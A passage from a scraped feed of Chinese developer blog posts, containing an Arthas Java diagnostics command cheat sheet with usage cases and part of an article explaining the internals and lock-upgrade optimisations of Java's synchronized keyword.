<p>若使用中遇到疑问、有优化建议，欢迎留言交流；觉得实用也可收藏备用，方便后续自己复用或分享给有需要的开发者朋友。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Arthas 线上常用命令速查手册：Java 诊断神器，5 分钟定位线上问题！]]></title>    <link>https://juejin.cn/post/7575133880436228147</link>    <guid>https://juejin.cn/post/7575133880436228147</guid>    <pubDate>2025-11-23T07:38:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575133880436228147" data-draft-id="7575119254313680922" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Arthas 线上常用命令速查手册：Java 诊断神器，5 分钟定位线上问题！"/> <meta itemprop="keywords" content="后端,Java"/> <meta itemprop="datePublished" content="2025-11-23T07:38:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sino爱学习"/> <meta itemprop="url" content="https://juejin.cn/user/1873223544473431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Arthas 线上常用命令速查手册：Java 诊断神器，5 分钟定位线上问题！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223544473431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sino爱学习
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T07:38:59.000Z" title="Sun Nov 23 2025 07:38:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10a4a87f485942cb92b2af3519bc6ce5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2lub-eIseWtpuS5oA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490187&amp;x-signature=BkgMikxh1aC3tyTrmZ8Mzbpa%2F88%3D" alt="1763883473870.png" loading="lazy"/></p>
<h2 data-id="heading-0">一、Arthas 是什么？为什么用它？</h2>
<p>Arthas 是阿里巴巴开源的一款 Java 线上诊断工具，无需重启 JVM、无需修改代码，即可实时监控、诊断 Java 应用的运行状态。</p>
<h3 data-id="heading-1">✅ 适用场景</h3>



































<table><thead><tr><th>场景</th><th>传统方式</th><th>Arthas 方式</th></tr></thead><tbody><tr><td>线上 CPU 飙高</td><td><code>top</code> + <code>jstack</code> 手动抓栈</td><td><code>thread -n 3</code> 一键定位</td></tr><tr><td>接口响应慢</td><td>加日志 → 重新发布</td><td><code>trace</code> 追踪耗时</td></tr><tr><td>代码未生效</td><td>怀疑人生</td><td><code>jad</code> 反编译确认</td></tr><tr><td>异常信息不全</td><td>日志缺失</td><td><code>watch</code> 实时观测</td></tr><tr><td>热更新</td><td>重启服务</td><td><code>redefine</code> 热加载</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-2">二、快速安装与启动</h2>
<h3 data-id="heading-3">1. 一键启动（推荐）</h3>
<pre><code class="hljs language-bash" lang="bash">curl -O https://arthas.aliyun.com/arthas-boot.jar
java -jar arthas-boot.jar
</code></pre>
<h3 data-id="heading-4">2. 选择目标进程</h3>
<pre><code class="hljs language-bash" lang="bash">[INFO] Found existing java process, please choose one:
* [1]: 12345 demo.jar
  [2]: 67890 app.jar
</code></pre>
<p>输入编号（如 <code>1</code>）即可 attach。</p>
<hr/>
<h2 data-id="heading-5">三、线上高频命令速查表</h2>






































































<table><thead><tr><th>命令</th><th>功能</th><th>示例</th></tr></thead><tbody><tr><td><code>dashboard</code></td><td>实时系统面板（线程、内存、GC）</td><td><code>dashboard -i 2000 -n 5</code></td></tr><tr><td><code>thread</code></td><td>线程分析</td><td><code>thread -n 3</code>（最忙线程）<br/><code>thread -b</code>（死锁）</td></tr><tr><td><code>trace</code></td><td>方法耗时追踪</td><td><code>trace com.example.UserService getUserById</code></td></tr><tr><td><code>watch</code></td><td>观测方法入参/返回值/异常</td><td><code>watch com.example.UserService getUserById "{params, returnObj, throwExp}" -x 3</code></td></tr><tr><td><code>jad</code></td><td>反编译类或方法</td><td><code>jad com.example.UserService</code></td></tr><tr><td><code>sc</code></td><td>查找已加载的类</td><td><code>sc -d com.example.UserService</code></td></tr><tr><td><code>sm</code></td><td>查看类方法签名</td><td><code>sm -d com.example.UserService</code></td></tr><tr><td><code>monitor</code></td><td>方法调用统计</td><td><code>monitor -c 60 com.example.UserService getUserById</code></td></tr><tr><td><code>tt</code></td><td>方法调用时光隧道（记录与回放）</td><td><code>tt -t com.example.UserService getUserById</code></td></tr><tr><td><code>heapdump</code></td><td>导出堆快照</td><td><code>heapdump /tmp/dump.hprof</code></td></tr><tr><td><code>profiler</code></td><td>生成 CPU 火焰图</td><td><code>profiler start</code> → <code>profiler stop --format html</code></td></tr><tr><td><code>redefine</code></td><td>热更新 <code>.class</code> 文件</td><td><code>redefine /tmp/UserService.class</code></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-6">四、实战案例：5 分钟定位线上问题</h2>
<h3 data-id="heading-7">案例 1：CPU 飙高</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 查看最忙线程</span>
thread -n 1

<span class="hljs-comment"># 2. 查看堆栈</span>
thread 123

<span class="hljs-comment"># 3. 反编译问题方法</span>
jad com.example.MyService calculate
</code></pre>
<h3 data-id="heading-8">案例 2：接口响应慢</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 追踪方法耗时</span>
trace com.example.controller.UserController getProfile

<span class="hljs-comment"># 2. 发现数据库查询慢</span>
trace com.example.dao.UserDAO findById

<span class="hljs-comment"># 3. 查看 SQL 参数</span>
watch com.example.dao.UserDAO findById <span class="hljs-string">"{params[0]}"</span> -x 1
</code></pre>
<h3 data-id="heading-9">案例 3：代码未生效（热更新）</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 反编译源码</span>
jad com.example.UserService --source-only &gt; /tmp/UserService.java

<span class="hljs-comment"># 2. 修改代码后编译</span>
mc /tmp/UserService.java -d /tmp

<span class="hljs-comment"># 3. 热加载</span>
redefine /tmp/com/example/UserService.class
</code></pre>
<hr/>
<h2 data-id="heading-10">五、注意事项与最佳实践</h2>

























<table><thead><tr><th>项目</th><th>建议</th></tr></thead><tbody><tr><td><strong>权限控制</strong></td><td>生产环境限制使用权限，避免误操作</td></tr><tr><td><strong>性能影响</strong></td><td><code>watch</code>、<code>trace</code> 会增强字节码，排查后及时 <code>stop</code> 或 <code>reset</code></td></tr><tr><td><strong>安全风险</strong></td><td>禁止将 Arthas 暴露在公网，建议通过隧道或跳板机访问</td></tr><tr><td><strong>命令冲突</strong></td><td><code>redefine</code> 与 <code>watch/trace</code> 冲突，使用前需 <code>reset</code></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-11">六、进阶：Docker &amp; K8s 集成建议</h2>
<h3 data-id="heading-12">Dockerfile 示例（预装 Arthas）</h3>
<pre><code class="hljs language-dockerfile" lang="dockerfile">FROM openjdk:8-jdk-alpine
COPY arthas /opt/arthas
COPY app.jar /app.jar
CMD java -jar /app.jar &amp; \
    sleep 15 &amp;&amp; \
    java -jar /opt/arthas/arthas-boot.jar --tunnel-server 'ws://tunnel-server:7777/ws' --app-name myapp
</code></pre>
<h3 data-id="heading-13">K8s 一键 attach（推荐）</h3>
<pre><code class="hljs language-bash" lang="bash">helm install arthas arthas/arthas-k8s
arthas-k8s attach myapp-0
</code></pre>
<hr/>
<h2 data-id="heading-14">七、总结：一张图记住 Arthas</h2>
<pre><code class="hljs language-text" lang="text">+--------------------------------------------------+
|                    Arthas                        |
|                                                  |
|  dashboard → 系统面板                            |
|  thread   → 线程/死锁                            |
|  trace    → 方法耗时                             |
|  watch    → 入参/返回值/异常                      |
|  jad      → 反编译                               |
|  tt       → 时光隧道（记录+回放）                 |
|  redefine → 热更新                               |
|  profiler → 火焰图                               |
+--------------------------------------------------+
</code></pre>
<hr/>
<h2 data-id="heading-15">八、参考资料与延伸阅读</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Farthas.aliyun.com%2Fdoc%2F" target="_blank" title="https://arthas.aliyun.com/doc/" ref="nofollow noopener noreferrer">Arthas 官方文档（中文）</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Falibaba%2Farthas" target="_blank" title="https://github.com/alibaba/arthas" ref="nofollow noopener noreferrer">Arthas GitHub 仓库</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Farthas.aliyun.com%2Fdoc%2Ftunnel.html" target="_blank" title="https://arthas.aliyun.com/doc/tunnel.html" ref="nofollow noopener noreferrer">Arthas Tunnel 集中管理方案</a></li>
</ul>
<hr/>
<p><strong>© 2025 技术博客 | 转载请注明原作者与链接</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[synchronized 的底层原理及优化机制]]></title>    <link>https://juejin.cn/post/7575162322239930368</link>    <guid>https://juejin.cn/post/7575162322239930368</guid>    <pubDate>2025-11-23T08:03:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575162322239930368" data-draft-id="7575807729722343458" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="synchronized 的底层原理及优化机制"/> <meta itemprop="keywords" content="面试"/> <meta itemprop="datePublished" content="2025-11-23T08:03:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="随风飘的云"/> <meta itemprop="url" content="https://juejin.cn/user/361110952753560"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            synchronized 的底层原理及优化机制
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/361110952753560/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    随风飘的云
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:03:06.000Z" title="Sun Nov 23 2025 08:03:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>synchronized</code> 是 Java 内置的<strong>悲观锁</strong>，核心作用是保证多线程环境下的<strong>原子性、可见性和有序性</strong>，从 JDK 1.6 开始进行了大量优化（如偏向锁、轻量级锁），性能大幅提升，成为并发编程中最常用的同步手段之一。</p>
<h2 data-id="heading-0">一、底层核心原理</h2>
<p><code>synchronized</code> 的实现依赖 <strong>Java 对象头（Mark Word）</strong>  和 <strong>监视器锁（Monitor）</strong> ，其核心逻辑是：<strong>通过竞争 Monitor 的所有权实现线程互斥</strong>。</p>
<h3 data-id="heading-1">1. 核心依赖：监视器锁（Monitor）</h3>
<p>Monitor 是 JVM 层面的抽象概念，本质是一种<strong>同步工具</strong>，可理解为 “锁的持有者管理机制”，每个 Java 对象都隐式关联一个 Monitor（即 “对象锁” 的底层载体）。</p>
<h4 data-id="heading-2">Monitor 的结构（简化）：</h4>
<ul>
<li><strong>Owner</strong>：当前持有锁的线程（同一时间只能有一个线程持有）。</li>
<li><strong>EntryList</strong>：等待获取锁的线程队列（线程处于 BLOCKED 状态）。</li>
<li><strong>WaitSet</strong>：调用 <code>wait()</code> 后释放锁的线程队列（线程处于 WAITING 状态）。</li>
</ul>
<h4 data-id="heading-3">Monitor 的核心逻辑：</h4>
<ol>
<li>
<p>线程尝试获取锁时，会竞争 Monitor 的 Owner 位置：</p>
<ul>
<li>若 Owner 为空，当前线程直接成为 Owner，持有锁。</li>
<li>若 Owner 已被其他线程占用，当前线程进入 EntryList 阻塞。</li>
</ul>
</li>
<li>
<p>线程释放锁时（退出同步块 / 方法、调用 <code>wait()</code>）：</p>
<ul>
<li>若调用 <code>wait()</code>，线程释放 Owner 身份，进入 WaitSet 等待被唤醒。</li>
<li>若正常释放，Owner 置空，JVM 从 EntryList 唤醒一个线程竞争锁。</li>
</ul>
</li>
</ol>
<h3 data-id="heading-4">2. 锁状态的存储基础：Java 对象头（Mark Word）</h3>
<p>Java 对象在内存中分为 3 部分：<strong>对象头、实例数据、对齐填充</strong>。其中，<strong>对象头的 Mark Word 是存储锁状态的关键</strong>。</p>
<h4 data-id="heading-5">Mark Word 的结构（动态变化，32 位 JVM 示例）：</h4>

























<table><thead><tr><th>锁状态</th><th>Mark Word 存储内容</th></tr></thead><tbody><tr><td>无锁</td><td>HashCode（25 位） + 对象年龄（4 位） + 是否偏向锁（1 位，0） + 锁状态（2 位，01）</td></tr><tr><td>偏向锁</td><td>偏向线程 ID（23 位） + Epoch（2 位） + 对象年龄（4 位） + 是否偏向锁（1 位，1） + 锁状态（2 位，01）</td></tr><tr><td>轻量级锁</td><td>指向栈帧中 “锁记录（Lock Record）” 的指针（30 位） + 锁状态（2 位，00）</td></tr><tr><td>重量级锁</td><td>指向 Monitor 的指针（30 位） + 锁状态（2 位，11）</td></tr></tbody></table>
<ul>
<li>锁状态由 <strong>2 位标志位</strong> + <strong>是否偏向锁标志位</strong> 共同决定。</li>
<li>Mark Word 的动态变化是 <code>synchronized</code> 锁升级的核心依据。</li>
</ul>
<h3 data-id="heading-6">3. synchronized 的两种使用方式及底层实现</h3>
<p><code>synchronized</code> 可修饰<strong>方法</strong>或<strong>代码块</strong>，底层实现略有差异，但核心都是竞争 Monitor。</p>
<h4 data-id="heading-7">（1）修饰代码块：monitorenter + monitorexit 指令</h4>
<p>编译后，同步代码块的前后会插入 <code>monitorenter</code> 和 <code>monitorexit</code> 字节码指令：</p>
<ul>
<li><strong>monitorenter</strong>：线程进入时执行，尝试获取 Monitor 所有权（成功则 Owner 设为当前线程，失败则阻塞）。</li>
<li><strong>monitorexit</strong>：线程退出时执行，释放 Monitor 所有权（Owner 置空，唤醒等待线程）。</li>
</ul>
<blockquote>
<p>注意：编译器会生成 <strong>2 个 monitorexit</strong>：一个对应正常退出，一个对应异常退出（确保锁一定释放，避免死锁）。</p>
</blockquote>
<h4 data-id="heading-8">（2）修饰方法：ACC_SYNCHRONIZED 标志</h4>
<p>修饰方法时，字节码中不会插入指令，而是在<strong>方法表（method_info）</strong>  中添加 <code>ACC_SYNCHRONIZED</code> 标志：</p>
<ul>
<li>线程调用方法时，JVM 检查该标志：若存在，先获取 Monitor 锁，再执行方法体。</li>
<li>方法执行完毕（正常返回 / 抛出异常），JVM 自动释放 Monitor 锁。</li>
</ul>
<h4 data-id="heading-9">类锁 vs 对象锁</h4>
<ul>
<li><strong>对象锁</strong>：修饰实例方法或代码块（锁对象为 <code>this</code> 或自定义对象），竞争的是 “实例对象关联的 Monitor”。</li>
<li><strong>类锁</strong>：修饰静态方法或代码块（锁对象为 <code>XXX.class</code>），竞争的是 “类对象（Class 实例）关联的 Monitor”。</li>
<li>本质：类锁也是对象锁（Class 是 JVM 加载的单例对象），两者独立，互不干扰。</li>
</ul>
<h2 data-id="heading-10">二、JDK 1.6+ 核心优化机制</h2>
<p>早期 <code>synchronized</code> 是 “重量级锁”，线程竞争失败会直接阻塞（切换到内核态，开销大）。JDK 1.6 引入<strong>锁升级机制</strong>和其他优化，让 <code>synchronized</code> 在无竞争 / 轻度竞争场景下性能接近乐观锁（如 <code>ReentrantLock</code>）。</p>
<p>核心优化思路：<strong>根据竞争强度动态切换锁状态（无锁 → 偏向锁 → 轻量级锁 → 重量级锁），减少无竞争 / 轻度竞争时的开销</strong>。</p>
<h3 data-id="heading-11">1. 锁升级机制（核心优化）</h3>
<p>锁升级是不可逆的（只能从低开销向高开销升级），目的是 “按需分配资源”：无竞争时用偏向锁，轻度竞争时用轻量级锁，激烈竞争时用重量级锁。</p>
<h4 data-id="heading-12">（1）偏向锁：无竞争场景的最优解</h4>
<p><strong>适用场景</strong>：锁由同一线程多次获取，无其他线程竞争（如单线程循环调用同步方法）。<strong>核心思想</strong>：“偏向” 第一个获取锁的线程，后续该线程无需竞争，直接持有锁。</p>
<h5 data-id="heading-13">实现原理：</h5>
<ol>
<li>
<p>线程第一次获取锁时，通过 CAS 将 Mark Word 中的 “偏向线程 ID” 设为当前线程 ID，“是否偏向锁” 设为 1，锁状态保持 01（偏向锁标识）。</p>
</li>
<li>
<p>后续该线程再次获取锁时，仅需检查：</p>
<ul>
<li>Mark Word 中的偏向线程 ID 是否为当前线程。</li>
<li>偏向锁标志是否为 1。</li>
<li>锁状态是否为 01。满足则直接获取锁，无需 CAS 或阻塞，开销极低。</li>
</ul>
</li>
</ol>
<h5 data-id="heading-14">偏向锁的撤销：</h5>
<p>当有其他线程尝试竞争偏向锁时，偏向锁会被 “撤销”，升级为轻量级锁。撤销流程：</p>
<ol>
<li>
<p>暂停持有偏向锁的线程（STW 短暂停顿）。</p>
</li>
<li>
<p>检查持有线程的状态：</p>
<ul>
<li>若线程已终止，直接将 Mark Word 重置为无锁状态。</li>
<li>若线程仍存活，将锁升级为轻量级锁，持有线程继续执行，竞争线程进入轻量级锁竞争。</li>
</ul>
</li>
</ol>
<h4 data-id="heading-15">（2）轻量级锁：轻度竞争场景的优化</h4>
<p><strong>适用场景</strong>：少量线程竞争锁，且竞争时间短（如两个线程交替获取锁）。<strong>核心思想</strong>：用 “自旋” 替代 “阻塞”，避免线程切换到内核态的开销。</p>
<h5 data-id="heading-16">实现原理：</h5>
<ol>
<li>
<p>线程获取锁时，先在当前栈帧中创建一个 <strong>Lock Record（锁记录）</strong> ，存储对象当前的 Mark Word 副本（Displaced Mark Word）。</p>
</li>
<li>
<p>通过 CAS 将对象的 Mark Word 更新为 “指向当前 Lock Record 的指针”：</p>
<ul>
<li>CAS 成功：线程获取轻量级锁，锁状态变为 00。</li>
<li>CAS 失败：说明有其他线程竞争，此时会先自旋（空循环）几次，尝试再次获取锁。</li>
</ul>
</li>
